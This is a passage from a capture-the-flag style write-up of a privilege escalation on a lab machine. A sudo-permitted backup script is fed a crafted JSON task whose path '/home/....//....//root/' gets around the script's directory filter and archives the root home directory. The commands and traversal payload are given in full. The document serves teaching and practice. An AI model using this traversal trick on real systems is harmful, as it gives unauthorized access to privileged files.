Privilege Escalation

By using sudo -l I found out that I can run a script as root.

(ALL : ALL) NOPASSWD: /usr/bin/backy.sh

While reading and trying to execute backy.sh, I find that I need to use a .json file. There is also a task.json file there already, so I can modify it.

task.json { "destination": "/home/martin/backups/", "multiprocessing": true, "verbose_log": false, "directories_to_archive": [ "/home/app-production/app" ], "exclude": [ ".*" ] }

While reading the script, I can see that I need to use the /home or /var directory as a starting point.

So I tried to modify the existing task.json file into a slightly different one.

test.json { "destination": "/home/martin/backups/", "multiprocessing": true, "verbose_log": true, "directories_to_archive": [ "/home/....//....//root/" ] }
martin@code:~/backups$ sudo /usr/bin/backy.sh test.json

It copied the root directory into a .tar.bz2 file and I extracted the files.

bzip2 -d code_home_.._.._root_2026_April.tar.bz2 tar -xvf code_home_.._.._root_2026_April.tar
